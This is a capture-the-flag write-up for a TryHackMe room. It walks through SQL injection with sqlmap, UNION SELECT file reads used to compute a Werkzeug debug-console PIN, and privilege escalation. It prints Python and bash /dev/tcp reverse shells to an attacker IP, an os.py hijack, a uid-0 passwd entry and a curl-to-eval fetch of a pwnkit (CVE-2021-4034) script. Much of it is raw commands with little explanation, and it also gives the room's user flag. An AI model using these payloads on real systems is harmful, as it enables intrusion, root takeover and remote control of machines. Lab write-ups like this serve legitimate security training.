# https://tryhackme.com/jr/surfingyetiiscomingtotown
+ What is the user flag?`THM{SQli_SsRF_2_WeRkZeuG_PiN_ExPloit}`
+ What is the root flag?
+ What is the yetikey4.txt flag?

## ENUMERATION PORT 8000
+ URL SQLInjection `http://10.10.35.168:8000/download?id=`
+ Using `sqlmap` database:
    ```
    [*] elfimages
    [*] information_schema
    [*] performance_schema
    ```
+ Dump `elfimages.elves`:
    ```
    +----+--------+------------------------------------------------+
    | id | url_id | url                                            |
    +----+--------+------------------------------------------------+
    | 1  | 1      | http://127.0.0.1:8000/static/imgs/mcblue1.svg  |
    | 2  | 2      | http://127.0.0.1:8000/static/imgs/mcblue2.svg  |
    | 3  | 3      | http://127.0.0.1:8000/static/imgs/mcblue3.svg  |
    | 4  | 4      | http://127.0.0.1:8000/static/imgs/suspects.png |
    +----+--------+------------------------------------------------+
    ```
+ current user: `mcskidy@localhost`
+ hostname: `proddb`

# EXPLOIT
+ Trying to by pass PIN for werkerzeug 3.0.0 console.
+ Looting The File using SQL Injection File Export (LFI / SSRF):
    - http://10.10.66.138:8000/download?id=' UNION ALL SELECT 'file:///proc/sys/kernel/random/boot_id
    - http://10.10.66.138:8000/download?id=' UNION ALL SELECT 'file:///sys/class/net/eth0/address `02:e7:a8:eb:9a:87`
    - http://10.10.66.138:8000/download?id=' UNION ALL SELECT 'file:///etc/machine-id `aee6189caee449718070b58132f2e4ba`

    ```bash
    $python -c "print(0x02e7a8eb9a87)" 
    3193994713735
    $python gen_machine_id.py 
    b'aee6189caee449718070b58132f2e4ba'
    $python werkzeug-debug-console-bypass/werkzeug-pin-bypass.py 
    Pin: 664-214-737
    ```

### PRIVILEGES ESCALATION
+ Python Reverse Shell 
    ```python
    python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.37.160",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
    ```
    + inject application by adding python file os.py
        - add this line to reverse shell os.py
        ```python
        #!/usr/bin/python3
        import os
        os.system('/bin/bash -c "bash -i >& /dev/tcp/10.4.37.160/1234 0>&1"')
        ```
os.system('/bin/bash -c "bash -i >& /dev/tcp/10.4.37.160/3117 0>&1"')
mcskidy@proddb:/dev/shm$ openssl passwd -1 -salt mcskidy dodol123
mcskidy:$1$mcskidy$FFrXzk8I7YLmzrU3mA9YX/:0:0::/home/mcskidy:/bin/bash
python3 -c 'import crypt;print(crypt.crypt("somesecret", crypt.mksalt(crypt.METHOD_SHA512)))'
python3 -c 'import crypt,getpass;print(crypt.crypt(getpass.getpass(), crypt.mksalt(crypt.METHOD_SHA512)))'
eval "$(curl -s http://10.4.37.160:81/CVE-2021-4034/cve-2021-4034.sh)"